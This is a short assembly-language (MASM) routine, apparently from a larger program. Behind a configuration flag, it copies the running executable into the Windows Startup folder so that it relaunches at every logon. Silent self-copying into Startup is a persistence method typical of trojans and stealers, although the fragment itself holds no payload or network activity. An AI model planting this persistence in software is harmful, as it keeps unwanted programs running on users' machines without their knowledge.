
CopyToStartup PROTO

.CODE

CopyToStartup PROC
    LOCAL currentPath[MAX_PATH]:BYTE
    LOCAL startupPath[MAX_PATH]:BYTE
    LOCAL fileName[MAX_PATH]:BYTE
    LOCAL destPath[MAX_PATH]:BYTE
    
     invoke lstrcmp, addr startup_check, addr sz_startup_check
	.if eax == -1
    	ret
	.endif
    
    invoke GetModuleFileName, NULL, addr currentPath, sizeof currentPath
    
    invoke SHGetFolderPath, NULL, CSIDL_STARTUP, NULL, 0, addr startupPath
  
    invoke PathFindFileName, addr currentPath
    invoke lstrcpy, addr fileName, eax
    
    invoke lstrcpy, addr destPath, addr startupPath
    invoke lstrcat, addr destPath, addr szBackslash   
    invoke lstrcat, addr destPath, addr fileName
    
  
    invoke CopyFile, addr currentPath, addr destPath, FALSE
    
    ret
CopyToStartup ENDP

